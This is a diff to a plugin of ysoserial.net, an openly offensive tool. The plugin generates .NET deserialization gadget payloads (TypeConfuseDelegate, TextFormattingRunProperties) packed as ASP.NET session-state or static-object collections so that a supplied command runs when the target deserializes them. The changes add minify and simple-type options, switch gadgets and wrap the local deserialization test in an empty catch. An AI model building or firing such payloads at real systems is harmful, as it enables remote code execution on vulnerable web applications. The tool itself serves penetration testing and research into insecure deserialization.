@@ -3,6 +3,7 @@ using NDesk.Options;
 using System;
 using ysoserial.Generators;
 using System.IO;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -23,8 +24,9 @@ namespace ysoserial.Plugins
         static string format = "";
         static string mode = "";
         static string command = "";
-        static Boolean test = false;
-        static Boolean minify = false;
+        static bool test = false;
+        static bool minify = false;
+        static bool useSimpleType = true;
 
         static OptionSet options = new OptionSet()
             {
@@ -32,7 +34,8 @@ namespace ysoserial.Plugins
                 {"o|output=", "the output format (raw|base64).", v => format = v },
                 {"c|command=", "the command to be executed", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
-                //{"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
+                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
+                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
 
         public string Name()
@@ -57,10 +60,15 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
+                inputArgs.Test = test;
             }
             catch (OptionException e)
             {
@@ -101,7 +109,7 @@ namespace ysoserial.Plugins
                 // hacky way ends */
 
                 /* here it is using the sane way! */
-                object serializedData = (object)new TypeConfuseDelegateGenerator().TypeConfuseDelegateGadget(command);
+                object serializedData = (object)TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
                 System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                 items[""] = serializedData;
                 MemoryStream stream = new MemoryStream();
@@ -122,7 +130,7 @@ namespace ysoserial.Plugins
             else
             {
                 // HttpStaticObjectsCollection
-                byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false, minify);
+                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                 byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                 serializedData.CopyTo(newSerializedData, 7);
                 newSerializedData[0] = 1; // for ReadInt32
@@ -134,9 +142,12 @@ namespace ysoserial.Plugins
                 if (test)
                 {
                     // PoC on how it works in practice
-                    MemoryStream stream = new MemoryStream((byte[]) payload);
-                    BinaryReader binReader = new BinaryReader(stream);
-                    System.Web.HttpStaticObjectsCollection test = System.Web.HttpStaticObjectsCollection.Deserialize(binReader);
+                    try { 
+                        MemoryStream stream = new MemoryStream((byte[]) payload);
+                        BinaryReader binReader = new BinaryReader(stream);
+                        System.Web.HttpStaticObjectsCollection test = System.Web.HttpStaticObjectsCollection.Deserialize(binReader);
+                    }
+                    catch { }
                 }
             }
 
